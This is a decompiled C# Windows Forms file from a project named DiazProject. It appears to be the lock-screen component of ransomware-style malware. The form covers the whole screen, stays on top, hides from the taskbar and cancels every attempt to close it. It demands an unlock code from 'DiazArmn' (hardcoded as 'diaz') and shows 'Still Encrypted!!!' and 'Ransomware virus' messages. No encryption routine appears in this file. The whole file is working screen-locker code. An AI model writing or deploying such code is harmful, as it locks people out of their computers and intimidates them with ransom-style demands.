using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DiazProject.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace DiazProject;

[DesignerGenerated]
public class Form2 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual CheckBox CheckBox1
	{
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual Label Label2
	{
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label2 = value;
		}
	}

	public Form2()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		((Form)this).add_Load((EventHandler)Form2_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Expected O, but got Unknown
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e0: Expected O, but got Unknown
		Label1 = new Label();
		TextBox1 = new TextBox();
		Button1 = new Button();
		CheckBox1 = new CheckBox();
		Label2 = new Label();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Courier New", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label = Label1;
		Point location = new Point(13, 13);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(465, 23);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("ENTER UNLOCK CODE GIVEN BY DiazArmn");
		((Control)TextBox1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox textBox = TextBox1;
		location = new Point(17, 40);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(461, 26);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(1);
		((Control)Button1).set_ForeColor(Color.Green);
		Button button = Button1;
		location = new Point(17, 95);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(75, 26);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_Text("Unlock!");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(31, 72);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(311, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(3);
		((ButtonBase)CheckBox1).set_Text("I agree to Diaz that I won't run the malicious program again...");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		Label2.set_AutoSize(true);
		((Control)Label2).set_ForeColor(Color.Red);
		Label label3 = Label2;
		location = new Point(14, 73);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(11, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(4);
		Label2.set_Text("*");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		size = new Size(1084, 620);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).set_ForeColor(Color.White);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("LockScreen");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		if (CheckBox1.get_Checked())
		{
			if (Operators.CompareString(TextBox1.get_Text(), "diaz", false) == 0)
			{
				Interaction.MsgBox((object)"PC Unlocked By Diaz!", (MsgBoxStyle)64, (object)"Ransomware virus");
				((Control)this).Hide();
				((Control)MyProject.Forms.Form3).Show();
			}
			else
			{
				Interaction.MsgBox((object)"You are still encrypted because the unlock code is invalid.", (MsgBoxStyle)16, (object)"Still Encrypted!!!");
			}
		}
		else
		{
			Interaction.MsgBox((object)"You are still encrypted because you don't agree to Diaz.", (MsgBoxStyle)16, (object)"Still Encrypted!!!");
		}
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		Cursor.Show();
	}
}
